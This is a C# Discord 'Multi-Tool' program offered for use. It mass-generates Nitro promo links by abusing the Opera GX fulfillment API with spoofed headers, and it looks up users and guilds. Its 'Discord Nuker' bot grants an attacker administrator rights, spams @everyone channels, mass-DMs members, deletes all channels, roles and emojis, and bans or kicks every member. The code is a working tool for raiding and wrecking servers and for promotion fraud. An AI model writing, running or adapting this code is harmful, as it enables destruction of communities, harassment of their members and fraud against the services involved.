using System;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DSharpPlus;
using DSharpPlus.Entities;
using DSharpPlus.EventArgs;
using Newtonsoft.Json.Linq;
using System.IO;
using System.Collections.Generic;
using static MultiTool.Discord.DiscordNuker;
using Newtonsoft.Json;
using static MultiTool.Utils;

namespace MultiTool
{
    public class Program
    {
        public static volatile bool keepRunning = true;
        static async Task Main(string[] args)
        {
            LoadConfigs();
            Console.Title = "Multi-Tool";
            Console.Clear();
            Console.WriteLine("Welcome to Multi-Tool");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.logOption("1", "Nitro Gen");
            Console.logOption("2", "User LookUp");
            Console.logOption("3", "Guild LookUp");
            Console.logOption("4", "Discord Nuker");
            Console.logOption("0", "Exit");

            Console.log("Enter your choice: ", false);
            string choice = Console.ReadLine();

            if (choice == "0") { Environment.Exit(0); }

            else if (choice == "1")
            {
                Console.log("How Much Do You Want To Gen: ", false);
                string howmuch = Console.ReadLine();
                Console.log("Generating pls Wait");
                if (int.TryParse(howmuch, out int howMany))
                {
                    for (int i = 0; i < howMany; i++) { Discord.NitroGen.SendPostRequest().Wait(); }
                    Console.log($"Links Generated: { Discord.NitroGen.quantity}");
                    Console.log($"You can find the results in: {Environment.CurrentDirectory + "\\results.txt"}");
                }
            }
            else if (choice == "2")
            {
                Console.log("Enter the user ID: ", false);
                string userId = Console.ReadLine();
                try
                {
                    string[] userInfo = await Discord.DiscordLookup.GetUserInfo(userId);
                    Console.log($"Username: {userInfo[0]}");
                    Console.log($"Global Username: {userInfo[1]}");
                    Console.log($"Avatar URL: {userInfo[2]}");
                    Console.log($"Banner URL: {userInfo[3]}");
                }
                catch (HttpRequestException e) { Console.log($"Error retrieving user information: {e.Message}"); }
            }
            else if (choice == "3")
            {
                Console.log("Enter the guild ID: ", false);
                string guildId = Console.ReadLine();
                try
                {
                    string[] guildInfo = await Discord.DiscordLookup.GetGuildInfo(guildId);
                    Console.log($"Name: {guildInfo[0]}");
                    Console.log($"invite: {guildInfo[1]}");
                }
                catch (HttpRequestException e) { Console.log($"Error retrieving user information: {e.Message}"); }
            }
            else if (choice == "4")
            {
                Discord.DiscordNuker.MainAsync();
                Discord.DiscordNuker.MainMenu();
            }

            else { Console.log("Invalid choice. Please try again."); }

            Console.WriteLine();
            Console.ReadKey();
            Console.Clear();
            Main(null);
            Discord.DiscordNuker.DiscordClient.DisconnectAsync().Wait();
        }
    }

    public class Console
    {
        public static void log(string text, bool a = true)
        {
            foreach (char c in text)
            {
                System.Console.Write(c);
                Thread.Sleep(20);
            }
            if (a) { System.Console.WriteLine(); }
        }
        public static void logOption(string num, string args)
        {
            System.Console.Write($" [{num}] {args}");
            System.Console.WriteLine();
        }
        public static string Title
        {
            get { return System.Console.Title; }
            set { System.Console.Title = value; }
        }
        public static void WriteLine(string value) { System.Console.WriteLine(value); }
        public static void Write(string value) { System.Console.Write(value); }
        public static void Clear() { System.Console.Clear(); }
        public static void WriteLine() { System.Console.WriteLine(); }
        public static string ReadLine() { return System.Console.ReadLine(); }
        public static ConsoleKeyInfo ReadKey() { return System.Console.ReadKey(); }
    }
    public class Discord
    {
        public class NitroGen
        {
            public static string folderPath = Environment.CurrentDirectory + "\\results.txt";
            public static int quantity = 0;
            public static string DiscordActivationURL = "https://discord.com/billing/partner-promotions/1180231712274387115/";
            public static async Task SendPostRequest()
            {
                string url = "https://api.discord.gx.games/v1/direct-fulfillment";
                string jsonData = "{\"partnerUserId\":\"a33864d3f487501951f7bdcda70561b5bfa38baae510a85062b2c93e22125c5d\"}";
                using (HttpClient httpClient = new HttpClient())
                {
                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, url);
                    request.Headers.Add("authority", "api.discord.gx.games");
                    request.Headers.Add("accept", "*/*");
                    request.Headers.Add("accept-language", "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7");
                    httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    request.Headers.Add("origin", "https://www.opera.com");
                    request.Headers.Add("referer", "https://www.opera.com/");
                    request.Headers.Add("sec-ch-ua", "\"Opera GX\";v=\"105\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"");
                    request.Headers.Add("sec-ch-ua-mobile", "?0");
                    request.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                    request.Headers.Add("sec-fetch-dest", "empty");
                    request.Headers.Add("sec-fetch-mode", "cors");
                    request.Headers.Add("sec-fetch-site", "cross-site");
                    request.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0");
                    request.Content = new StringContent(jsonData, Encoding.UTF8, "application/json");
                    HttpResponseMessage httpResponseMessage = await httpClient.SendAsync(request);
                    HttpResponseMessage response = httpResponseMessage;
                    httpResponseMessage = null;
                    if (response.IsSuccessStatusCode)
                    {
                        string text = await response.Content.ReadAsStringAsync();
                        string result = text;
                        JObject json = JObject.Parse(result);
                        string tokenValue = json["token"].ToString();
                        quantity++;
                        string finalLink = DiscordActivationURL + tokenValue;
                        Save(finalLink);
                    }
                    else
                    {
                        Console.WriteLine(string.Format("Error: {0}", response.StatusCode));
                    }
                }
            }
            public static void Save(string url) { using (StreamWriter sw = new StreamWriter(folderPath, true)) { sw.WriteLine(url); } }
        }
        public class DiscordLookup
        {
            private static HttpClient client = new HttpClient();
            public static async Task<string[]> GetUserInfo(string userId)
            {
                string url = $"https://discordlookup.mesavirep.xyz/v1/user/{userId}";
                HttpResponseMessage response = await client.GetAsync(url);
                response.EnsureSuccessStatusCode();

                string responseBody = await response.Content.ReadAsStringAsync();
                JObject userJson = JObject.Parse(responseBody);

                string globalnameUrl = userJson["global_name"].ToString();
                string username = userJson["username"].ToString();
                string avatarUrl = userJson["avatar"]["link"].ToString();
                string bannerUrl = userJson["banner"]["link"].ToString();

                return new string[] { username, globalnameUrl, avatarUrl, bannerUrl };
            }
            public static async Task<string[]> GetGuildInfo(string guildId)
            {
                string url = $"https://discordlookup.mesavirep.xyz/v1/guild/{guildId}";
                HttpResponseMessage response = await client.GetAsync(url);
                response.EnsureSuccessStatusCode();

                string responseBody = await response.Content.ReadAsStringAsync();
                JObject userJson = JObject.Parse(responseBody);

                string name = userJson["name"].ToString();
                string instantinvite = userJson["instant_invite"].ToString();

                return new string[] { name, instantinvite };
            }
        }
        public class DiscordNuker 
        {
            public static DiscordClient DiscordClient;
            public static List<BotGuild> botGuilds;
            public static Configuration configuration;
            public struct BotGuild
            {
                public DiscordGuild Guild { get; }
                public ulong Id => Guild.Id;
                public BotGuild(DiscordGuild gld) { Guild = gld; }
                public override string ToString() { return Guild.Name; }
            }
            public static async Task MainAsync()
            {
                botGuilds = new List<BotGuild>();

                var config = new DiscordConfiguration
                {
                    Token = configuration.Token,
                    TokenType = TokenType.Bot,
                    AutoReconnect = true,
                    MinimumLogLevel = Microsoft.Extensions.Logging.LogLevel.None,
                    Intents = DiscordIntents.AllUnprivileged
                };

                DiscordClient = new DiscordClient(config);

                DiscordClient.GuildAvailable += Utils.DiscordClient_GuildAvailable;
                DiscordClient.GuildCreated += Utils.DiscordClient_GuildCreated;

                await DiscordClient.ConnectAsync(new DiscordActivity("a", ActivityType.Playing), UserStatus.Online);
                await Task.Delay(-1);
            }
            public static async void MainMenu()
            {
                Console.Title = "Multi-Tool";
                Console.Clear();
                Console.WriteLine("Welcome to Multi-Tool");
                Console.WriteLine();
                Console.WriteLine("Options:");
                Console.logOption("1", "Create Admin Role");
                Console.logOption("2", "Spam Create Channels");
                Console.logOption("3", "Mass DM Members");
                Console.logOption("4", "Delete All Channels");
                Console.logOption("5", "Delete All Roles");
                Console.logOption("6", "Delete All Emojis");
                Console.logOption("7", "Ban All Members");
                Console.logOption("8", "Kick All Members");
                Console.log("Enter your choice: ", false);
                string choice = Console.ReadLine();
                if (choice == "1") { await Nuking.CreateAdminRole(Utils.GetGuildById(configuration.GuildId)); }
                else if (choice == "2")
                {
                    Console.log("How Much Channel: ", false);
                    string num = Console.ReadLine();
                    Console.log("Channel Names: ", false);
                    string num2 = Console.ReadLine();
                    if (int.TryParse(num, out int howMany))
                    {
                        await Nuking.CreateSpamChannels(Utils.GetGuildById(configuration.GuildId), howMany, num2);
                    }
                }
                else if (choice == "3")
                {
                    Console.log("The Msg To Send To Users: ", false);
                    string num = Console.ReadLine();
                    await Nuking.SendMessageToUsers(Utils.GetGuildById(configuration.GuildId), num);
                }
                else if (choice == "4") { await Nuking.DeleteAllChannels(Utils.GetGuildById(configuration.GuildId)); }
                else if (choice == "5") { await Nuking.DeleteAllRoles(Utils.GetGuildById(configuration.GuildId)); }
                else if (choice == "6") { await Nuking.DeleteAllEmojis(Utils.GetGuildById(configuration.GuildId)); }
                else if (choice == "7") { await Nuking.BanAllMembers(Utils.GetGuildById(configuration.GuildId)); }
                else if (choice == "8") { await Nuking.KickAllMembers(Utils.GetGuildById(configuration.GuildId)); }

                Console.WriteLine();
                Console.ReadKey();
                Console.Clear();
                MainMenu();
            }
            public class Nuking
            {
                public static async Task CreateAdminRole(DiscordGuild guild)
                {
                    if (!Utils.CheckPermission(guild, Permissions.ManageRoles)) { return; }
                    try
                    {
                        Console.log("User id -> ", false);

                        string userId = Console.ReadLine();
                        ulong uintId = Convert.ToUInt64(userId);

                        Console.log("Creating admin role", false);

                        DiscordRole adminRole = await guild.CreateRoleAsync("nukeAdminRole", Permissions.Administrator);
                        DiscordMember member = await guild.GetMemberAsync(uintId);

                        Console.log($"Giving admin role to user {member.DisplayName}");
                        Console.log($"admin role is on {member.DisplayName}");
                        await member.GrantRoleAsync(adminRole);
                        Console.ReadKey();
                        MainMenu();
                    }
                    catch (Exception ex)
                    {
                        Console.log(ex.ToString());
                        Console.ReadKey();
                        MainMenu();
                    }
                }
                public static async Task CreateSpamChannels(DiscordGuild guild, int num, string num2)
                {
                    if (!Utils.CheckPermission(guild, Permissions.ManageChannels)) { return; }

                    Console.log("Creating channels");
                    for (int i = 0; i < num; i++)
                    {
                        try
                        {
                            if (!Program.keepRunning) { break; }

                            DiscordChannel channel = await guild.CreateChannelAsync($"{num2}-{i}", ChannelType.Text);
                            await channel.SendMessageAsync($"@everyone yellooooooow");
                        }
                        catch (Exception) { }
                    }
                }
                public static async Task SendMessageToUsers(DiscordGuild guild, string msg)
                {
                    IReadOnlyCollection<DiscordMember> members = await guild.GetAllMembersAsync();
                    ulong bot = DiscordClient.CurrentUser.Id;

                    Console.log("Sending message to members");
                    foreach (DiscordMember member in members)
                    {
                        try
                        {
                            if (!Program.keepRunning) { break; }
                            if (member.Id != bot) { await member.SendMessageAsync(msg); }
                        }
                        catch (Exception) { }
                    }
                }
                public static async Task DeleteAllChannels(DiscordGuild guild)
                {
                    if (!Utils.CheckPermission(guild, Permissions.ManageChannels)) { return; }
                    IReadOnlyList<DiscordChannel> channels = await guild.GetChannelsAsync();

                    Console.log("Deleting channels");
                    foreach (DiscordChannel d in channels)
                    {
                        try
                        {
                            if (!Program.keepRunning) { break; }
                            await d.DeleteAsync();
                        }
                        catch (Exception) { }
                    }
                }
                public static async Task DeleteAllRoles(DiscordGuild guild)
                {
                    if (!Utils.CheckPermission(guild, Permissions.ManageRoles)) { return; }
                    IReadOnlyDictionary<ulong, DiscordRole> roles = guild.Roles;

                    Console.log("Deleting roles");
                    foreach (KeyValuePair<ulong, DiscordRole> keyValue in roles)
                    {
                        try
                        {
                            if (!Program.keepRunning) { break; }
                            await keyValue.Value.DeleteAsync();
                        }
                        catch (Exception) { }
                    }
                }
                public static async Task DeleteAllEmojis(DiscordGuild guild)
                {
                    if (!Utils.CheckPermission(guild, Permissions.ManageEmojis)) { return; }
                    IReadOnlyList<DiscordGuildEmoji> emojis = await guild.GetEmojisAsync();

                    Console.log("Deleting emojis");
                    foreach (DiscordGuildEmoji emoji in emojis)
                    {
                        try
                        {
                            if (!Program.keepRunning) { break; }
                            await guild.DeleteEmojiAsync(emoji);
                        }
                        catch (Exception) { }
                    }
                }
                public static async Task BanAllMembers(DiscordGuild guild)
                {
                    if (!Utils.CheckPermission(guild, Permissions.BanMembers)) { return; }
                    IReadOnlyCollection<DiscordMember> members = await guild.GetAllMembersAsync();
                    ulong bot = DiscordClient.CurrentUser.Id;

                    Console.log("Banning members");
                    foreach (DiscordMember member in members)
                    {
                        try
                        {
                            if (!Program.keepRunning) { break; }
                            if (member.Id != bot) { await member.BanAsync(); }
                        }
                        catch (Exception) { }
                    }
                }
                public static async Task KickAllMembers(DiscordGuild guild)
                {
                    if (!Utils.CheckPermission(guild, Permissions.KickMembers)) { return; }
                    IReadOnlyCollection<DiscordMember> members = await guild.GetAllMembersAsync();

                    ulong bot = DiscordClient.CurrentUser.Id;

                    Console.log("kicking members");
                    foreach (DiscordMember member in members)
                    {
                        try
                        {
                            if (!Program.keepRunning) { break; }
                            if (member.Id != bot) { await member.RemoveAsync(); }
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
    }
    public class Utils 
    {
        // Discord Stuff
        public static Task DiscordClient_GuildCreated(DiscordClient sender, GuildCreateEventArgs e) { botGuilds.Add(new BotGuild(e.Guild)); return Task.CompletedTask; }
        public static Task DiscordClient_GuildAvailable(DiscordClient sender, GuildCreateEventArgs e) { botGuilds.Add(new BotGuild(e.Guild)); return Task.CompletedTask; }
        public static ulong GetBotId() => Discord.DiscordNuker.DiscordClient.CurrentUser.Id;
        public static void GetBotGuilds()
        {
            foreach (BotGuild guild in botGuilds)
            {
                Console.log($"[{guild.Guild.Name}] + {guild.Id.ToString()}");
            }
            Console.log("Press Enter to go back!");
        }
        public static DiscordGuild GetGuildById(string guildId)
        {
            try
            {
                foreach (BotGuild guild in botGuilds)
                {
                    if (guild.Id.ToString() == guildId) { return guild.Guild; }
                }

                return default;
            }
            catch (Exception ex)
            {
                Console.log(ex.ToString());
                Console.ReadKey();
                return default;
            }
        }
        public static bool CheckPermission(DiscordGuild guild, Permissions permission)
        {
            if (guild.GetMemberAsync(Utils.GetBotId()).GetAwaiter().GetResult().Permissions.HasPermission(permission)) { return true; }
            Console.log("Bot has no permissions!");
            return false;
        }

        // Config 
        public static Configuration configuration;
        public class Configuration
        {
            public string Token { get; set; } = "Enter your token here";
            public string GuildId { get; set; } = "Enter your guild id here";
        }
        public static bool LoadConfigs()
        {
            string filename = "configs.json";

            try
            {
                if (!File.Exists(filename))
                {
                    CreateDefaultConfigFile(filename);
                    return false;
                }

                string json = File.ReadAllText(filename);
                configuration = JsonConvert.DeserializeObject<Configuration>(json);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error loading configurations: {ex.Message}");
                return false;
            }
        }
        public static void CreateDefaultConfigFile(string filename)
        {
            try
            {
                string filecontent = JsonConvert.SerializeObject(new Configuration(), Formatting.Indented);
                File.WriteAllText(filename, filecontent);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error creating default config file: {ex.Message}");
            }
        }
    }
}
